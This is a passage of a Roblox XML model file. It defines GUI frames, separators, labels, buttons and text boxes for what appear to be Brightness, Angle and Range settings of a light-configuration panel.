													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBXBEE4DDB5291F4B36A9712BA645A762CF">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4284572001</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Separator</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>151</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>4</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX7F6E3E535F5347DD83A41FA027EF465F">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4284572001</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Separator</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>151</XO>
													<YS>0</YS>
													<YO>16</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>4</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBXFA03BEF54F16433AAC7B1C4E4D91D874">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4284572001</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Separator</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>151</XO>
													<YS>0</YS>
													<YO>10</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>4</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
									<Item class="Frame" referent="RBX2399F9E43D604B3CB262047E0A0F51EE">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">BrightnessOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>45</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX50C69F431E3E41EB8B46744B834336FF">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>70</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Brightness</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX6584934350F141D1BBCFCC80EB08E94B">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Input</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>60</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBXED799B90ABEE49CB9FDE8804A4C7682D">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBX7D8D4FE741204F25A68E9B191775E002">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX1187436E4F0844EF80D732DC6D9EB379">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBXA71B485351444A85AD8363A65B85B80F">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">1</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
									</Item>
									<Item class="Frame" referent="RBXF9FCB05AE2134FF9B03351585059203C">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">AngleOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>115</XO>
												<YS>0</YS>
												<YO>46</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-115</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX0D360A101D3E48F39FAE922D8C017DA8">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>70</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Angle</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX2EDF9F7215BB41798B3DB951D054D692">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Input</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>35</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBX42CE53225B2048E882D8FC4C885008FF">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBXEA8FF5546BDF451A920829B280B64E25">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX5368ED1C4D214350B3D8FE8187C7B095">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBX0B1E8D1608B649B0A641AE6AC982BAB7">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">90</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
									</Item>
									<Item class="Frame" referent="RBX8446D55385304955938EF8F2C0A6FAD2">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">RangeOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>80</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX8FD59887D10444DCBED4B8C1E077B493">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>70</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Range</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBXA61E9BAFB36F49569B6AF062AE7736EE">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Input</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>40</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBX8F383931BA00443D91EF5C0F95942A76">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
